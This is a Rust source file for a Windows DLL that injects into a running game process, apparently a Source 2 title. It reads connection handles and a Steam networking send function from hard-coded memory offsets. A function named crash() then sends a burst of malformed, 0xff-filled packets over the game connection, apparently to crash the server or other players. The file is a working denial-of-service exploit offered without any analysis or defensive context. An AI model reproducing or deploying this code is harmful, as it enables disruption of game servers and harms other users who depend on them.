use anyhow::Context;
use std::mem;
use std::os::raw::c_void;
use windows::Win32::Foundation::HMODULE;
use windows::Win32::System::LibraryLoader::FreeLibraryAndExitThread;
use windows::Win32::System::SystemServices::DLL_PROCESS_ATTACH;
use winsafe::prelude::{kernel_Hinstance, Handle};
use winsafe::HINSTANCE;

#[no_mangle]
pub extern "system" fn DllMain(module: usize, reason: u32, _reserved: usize) -> i32 {
    unsafe {
        if reason == DLL_PROCESS_ATTACH {
            crash().expect("failure");
            std::thread::spawn(move || {
                FreeLibraryAndExitThread(HMODULE(module as _), 0);
            });
        }
        1
    }
}

const RELIABLE_FLAG: i32 = 8;

unsafe fn crash() -> anyhow::Result<()> {
    let steam_networking_sockets = HINSTANCE::GetModuleHandle(Some("steamnetworkingsockets.dll"))
        .context("missing steamnetworkingsockets.dll")?;
    let engine2 = HINSTANCE::GetModuleHandle(Some("engine2.dll")).context("missing engine2.dll")?;
    let network_system = HINSTANCE::GetModuleHandle(Some("networksystem.dll"))
        .context("missing networksystem.dll")?;

    let send_message_to_connection: extern "C" fn(
        *mut c_void,
        i32,
        *const u8,
        usize,
        i32,
        *mut c_void,
    ) -> i32 = mem::transmute(steam_networking_sockets.ptr().byte_offset(0x8ee80));

    let net_interface = *(network_system.ptr().byte_offset(0x275d00) as *mut *mut c_void);
    let conn_handle_part = *(engine2.ptr().byte_offset(0x5946b0) as *mut *mut c_void);
    let conn_handle_part = *(conn_handle_part.byte_offset(0xb0) as *mut *mut c_void);
    let conn_handle = *(conn_handle_part.byte_offset(0x38) as *mut i32);

    let mut packet_data = [0xffu8; 4096];
    packet_data[4] = 0x00;
    for i in 0..50 {
        let packet_length = (i * 80).min(packet_data.len());
        send_message_to_connection(
            net_interface,
            conn_handle,
            packet_data.as_ptr(),
            packet_length,
            RELIABLE_FLAG,
            std::ptr::null_mut(),
        );
    }

    Ok(())
}
